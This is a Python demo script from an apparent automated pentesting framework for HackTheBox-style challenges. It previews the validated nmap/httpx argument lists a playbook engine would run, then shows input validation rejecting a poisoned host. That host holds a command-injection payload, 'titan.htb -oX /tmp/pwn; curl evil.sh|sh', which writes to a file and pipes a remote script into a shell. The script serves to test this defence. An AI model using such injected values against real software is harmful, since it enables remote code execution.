"""Phase-1 demo — the hardened argv the brain would dispatch, NO Kali.

Seeds a recon world (the events an nmap+httpx chain emits), asks the Playbook
Engine what to run, and prints the exact, validated argv each decided action
maps to through the typed-argv layer. Then it injects a HOSTILE discovered host
(a leaked vhost carrying an nmap-option/command-injection payload) and shows the
adapter rejecting it instead of building a command — the whole point of the
choke point.

    python -m lotusmcp.demo.argv_preview
"""
from __future__ import annotations

import tempfile
from pathlib import Path

from lotusmcp.demo.seed_recon import _httpx, _nmap
from lotusmcp.executor.argv import ArgvRejected, NoAdapter
from lotusmcp.executor.plan import plan_action
from lotusmcp.kernel.case import Case
from lotusmcp.kernel.events import EventDraft
from lotusmcp.playbooks.engine import PlaybookEngine
from lotusmcp.playbooks.model import World

HOST = "10.10.11.53"


def _preview(world: World, phase: str) -> None:
    ps = PlaybookEngine().propose(
        world, phase, category_conf={"web": 0.8, "recon": 0.8, "crypto": 0.8})
    print(f"\n── phase {phase}: {len(ps.proposals)} proposal(s)")
    for p in ps.proposals:
        a = p.action
        try:
            plans = plan_action(a, world)
        except NoAdapter:
            print(f"  · {a.capability:<15} {a.target_display:<28} (Regime-B, no argv adapter)")
            continue
        except ArgvRejected as e:
            print(f"  ✗ {a.capability:<15} {a.target_display:<28} REJECTED: {e}")
            continue
        for plan in plans:
            print(f"  → {a.capability:<15} {plan.as_line()}")


def main() -> None:
    base = Path(tempfile.mkdtemp(prefix="lotus_argv_demo_"))
    case = Case.create(base, "argv-preview", title="Titan Gateway", category="web",
                       flag_format=r"HTB\{[0-9a-f]{32}\}", platform="HackTheBox")
    for gen in (_nmap(), _httpx()):
        for draft in gen:
            case.append(draft)

    world = World.from_graph_db(case.rebuild()["graph_db"])
    print("=" * 74)
    print("HARDENED ARGV the OODA loop would dispatch (shell=False, validated):")
    print("=" * 74)
    _preview(world, "RECON")
    _preview(world, "ENUMERATE")

    # --- now poison the world with a hostile discovered host ---
    evil = "titan.htb -oX /tmp/pwn; curl evil.sh|sh"
    case.append(EventDraft("entity.asserted", {"kind": "executor", "name": "vhost@1"},
                           {"kind": "host", "natural_key": {"addr": evil}}))
    world = World.from_graph_db(case.rebuild()["graph_db"])
    print("\n" + "=" * 74)
    print(f"injected hostile discovered host: {evil!r}")
    print("=" * 74)
    _preview(world, "RECON")
    print("\nthe choke point refused to build a command from attacker-controlled input.")


if __name__ == "__main__":
    main()
